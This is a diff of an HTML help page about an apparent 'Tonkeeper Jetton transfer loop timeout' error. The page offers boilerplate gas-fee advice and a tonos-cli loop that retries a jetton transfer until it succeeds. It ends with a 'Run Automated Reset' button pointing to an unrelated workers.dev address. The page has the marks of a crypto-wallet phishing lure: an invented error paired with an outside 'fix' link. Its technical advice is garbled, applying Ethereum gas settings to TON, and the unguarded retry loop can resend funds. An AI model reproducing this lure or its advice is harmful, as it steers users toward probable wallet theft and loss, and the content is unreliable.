@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0f111a;
+        font-family: BlinkMacSystemFont;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -41,36 +41,32 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users of the TON ecosystem may encounter an error message indicating a "Tonkeeper Jetton transfer loop timeout" when attempting to transfer jettons, resulting in failed transactions and potential losses.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, resulting in failed transactions and potential losses.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timeout in the Tonkeeper Jetton transfer loop, which can be caused by network congestion, high gas fees, or issues with the smart contract responsible for facilitating the transfer.</li>
+<li>The error occurs due to a timeout in the Tonkeeper Jetton transfer loop, which can be caused by network congestion, high gas fees, or issues with the Tonkeeper smart contract.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To troubleshoot the issue, users can attempt the following:</li>
-<li>Increase the gas limit to prioritize the transaction</li>
-<li>Reduce the transaction amount to minimize network fees</li>
-<li>Utilize an alternative transfer method, such as a different wallet or exchange</li>
+<li>Increase the gas limit for the transaction to prioritize it in the network:</li>
+<li>Update the transaction settings to use a higher gas price</li>
+<li>Use a custom transaction sender to manually set the gas limit</li>
+<li>Implement a retry mechanism using the following code:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_wallet&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;recipient_wallet&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;100 jettons&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;20000&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;20 ton&quot;</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code><span class="k">while</span><span class="w"> </span>!<span class="w"> </span>tonos-cli<span class="w"> </span>call<span class="w"> </span><span class="nv">$ADDR</span><span class="w"> </span>sendJettons<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--input<span class="w"> </span><span class="s2">&quot;{\&quot;dest\&quot;:\&quot;</span><span class="nv">$DEST</span><span class="s2">\&quot;,\&quot;amount\&quot;:\&quot;</span><span class="nv">$AMOUNT</span><span class="s2">\&quot;}&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--abi<span class="w"> </span>JettonWallet.abi.json<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>sleep<span class="w"> </span><span class="m">1</span>
+<span class="k">done</span>
 </code></pre></div>
 
-<p>Consider using an external console to execute manual override commands for more flexibility. </p>
+<p>Consider using an external console for more advanced debugging and transaction management. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Familiarity with the TON ecosystem and its native cryptocurrency</li>
-<li>Understanding of smart contract functionality and gas fees</li>
-<li>Access to a compatible wallet or exchange platform</li>
+<li>Tonos-cli installed and configured on the system</li>
+<li>Jetton Wallet ABI file (JettonWallet.abi.json) available</li>
+<li>Sufficient funds and jettons in the wallet for the transaction</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
